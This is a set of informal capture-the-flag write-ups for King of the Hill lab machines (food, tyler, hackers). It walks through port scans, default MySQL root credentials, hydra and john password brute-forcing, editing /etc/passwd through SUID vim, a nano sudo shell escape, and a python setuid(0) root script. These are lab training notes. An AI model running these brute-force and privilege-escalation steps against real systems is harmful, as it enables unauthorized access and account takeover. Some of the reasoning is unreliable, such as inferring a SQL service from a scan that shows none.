# machine name for KOTH: food(linux)
First,do a basic nmap scan and then you would find details about the IP address.<br/>
```
#### Nmap 7.80 scan initiated Thu Jun 11 15:19:27 2020 as: nmap -sC -sV -oN nmap.txt 10.10.77.101
Nmap scan report for 10.10.77.101<br/>
Host is up (0.21s latency).<br/>
Not shown: 999 closed ports <br/>
PORT     STATE SERVICE VERSION <br/>
9999/tcp open  abyss? <br/>
| fingerprint-strings: <br/>
|   FourOhFourRequest: <br/>
|     HTTP/1.0 200 OK <br/>
|     Date: Thu, 11 Jun 2020 09:50:12 GMT <br/>
|     Content-Length: 4 <br/>
|     Content-Type: text/plain; charset=utf-8 <br/>
|     king <br/>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: <br/>
|     HTTP/1.1 400 Bad Request <br/>
|     Content-Type: text/plain; charset=utf-8 <br/>
|     Connection: close <br/>
|     Request <br/>
|   GetRequest, HTTPOptions: <br/>
|     HTTP/1.0 200 OK <br/>
|     Date: Thu, 11 Jun 2020 09:50:11 GMT <br/>
|     Content-Length: 4 <br/>
|     Content-Type: text/plain; charset=utf-8 <br/>
|_    king <br/>
```
from the scan we got to know that there is a sql database running on.<br/>
with the help of command <br/>
mysql -u root -h ip of machine  -p <br/>
login to sql database with pass root <br/>
with the help of mysql database explore the tables.that will get the first flag and a user by the ssh credentials <br/>
after getting the shell now its time to get the root.<br/>
so use find command and search for the vulnerbility.<br/>
find / -perm -u=s -type f 2>/dev/null<br/>
from this scan you will find out the available options i found that "/usr/bin/vim.basic"<br/>
is available.so,what are you waiting for just get the password changed by<br/>
vim /etc/passwd<br/> //dont forget to encrypt your password while changing!
and change the passwd thats it then just login with root and your password.<br/>
 
<hr>
  
 # machine tyler(linux)


<hr>

From basic nmap scan we get to know that smbclient is open so get it into the smb client and get the flag and <br/>
alert txt<br>
Next do a dirsearch with tag -e html,txt and help of rockyou.txt<br/>
you will get an extension named betatest.when you open you will find a user check with which you will get the username.<br>
and from the alert.txt you would get a password so with the help of username and password do ssh login. <br/>
here you go, finnaly got your user so the next step is for root.<br/>
for getting root i used ./linpes.sh script which helped me to find out there is vulnerbility VIM so with help of vim<br/>
i had added permision for suddorfile letting narrator to get the root shell.<br/>
once you get the root Just defend your king.txt

# Hackers.
=> This machine is entairly based on Bruteforce.So comparitively with other machines it takes some time.

1> nmap -sC -p- 10.10.142.184

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
9999/tcp open  abyss?
```
2> ftp has an Anonymous login.
from ftp we will get a note.

which says 
```
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```
3> bruteforce the password of gcrawford ftp using hydra
```
hydra ftp://10.10.142.184 -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64
```
once you get the password login to ftp and you will find out the id_rsa key and business.txt.

4> As id_rsa key is password protected lets use ssh2john and bruteforce the hash you got
```
 python3 /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
 ```
 ```
 john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 5> once you get the password just login to the ssh connction.
 ```
 root@5h4rk:~/koth-hackers# ssh -i id_rsa gcrawford@10.10.142.184
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
Enter passphrase for key 'id_rsa': 
Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1
gcrawford@gibson:~$ whoami
gcrawford
gcrawford@gibson:~$ ls
business.txt
gcrawford@gibson:~$ ls -lah
total 40K
drwxr-x--- 6 gcrawford gcrawford 4.0K Apr 30 04:25 .
drwxr-xr-x 6 root      root      4.0K Apr 29 22:05 ..
lrwxrwxrwx 1 gcrawford gcrawford    9 Apr 30 01:31 .bash_history -> /dev/null
-rw-r--r-- 1 gcrawford gcrawford  220 Apr 29 04:00 .bash_logout
-rw-r--r-- 1 gcrawford gcrawford 3.7K Apr 29 04:00 .bashrc
-r-------- 1 gcrawford gcrawford  252 Apr 30 04:25 business.txt
drwx------ 2 gcrawford gcrawford 4.0K Apr 29 17:05 .cache
drwx------ 3 gcrawford gcrawford 4.0K Apr 29 17:05 .gnupg
drwxrwxr-x 3 gcrawford gcrawford 4.0K Apr 29 20:53 .local
-rw-r--r-- 1 gcrawford gcrawford  807 Apr 29 04:00 .profile
drwx------ 2 gcrawford gcrawford 4.0K May  9 21:10 .ssh
gcrawford@gibson:~$ sudo -l
[sudo] password for gcrawford:        
Matching Defaults entries for gcrawford on gibson:
    env_reset, pwfeedback, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gcrawford may run the following commands on gibson:
    (root) /bin/nano /home/gcrawford/business.txt
 ```

6> Time to root the machine! 
as we can see that we can run nano as root. from gtfobins there is cheat code:-
use:-
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
finally rooted the machine!

## hackers writeup 02
namp scan gives you the folowing results:-
```
root@5h4rk:~# nmap -sV -p- 10.10.166.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 17:59 BST
Nmap scan report for 10.10.166.184
Host is up (0.022s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
9999/tcp open  abyss?
```
=> there is a Anonymous login avilabel with FTP so enumerating <br>
that gives you a note which says:- <br>
```
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```
as the note said rcampbell has a weak password so with the help of hydra we can get the password for ssh using:-

```
hydra ssh://10.10.99.187 -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64
```
once you get the credentials just login using them you got the user shell!  <br>
Now time for root. <br>
so doing some enumeration i found this:-
```
rcampbell@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
setuid looks intresting. that allows the process to use the setuid system call fully. <br>
so with the help of that lets set uid with os.setuid(id) and get root this is the script i used.

```
import os,pty

os.setuid(0)
pty.spawn("/bin/bash")
```
running this gave me root.
```
rcampbell@gibson:~$ python3 root.py 
root@gibson:~# id -a
uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
``` 
so you rooted the machine its time to echo your name to king and protect it :) 



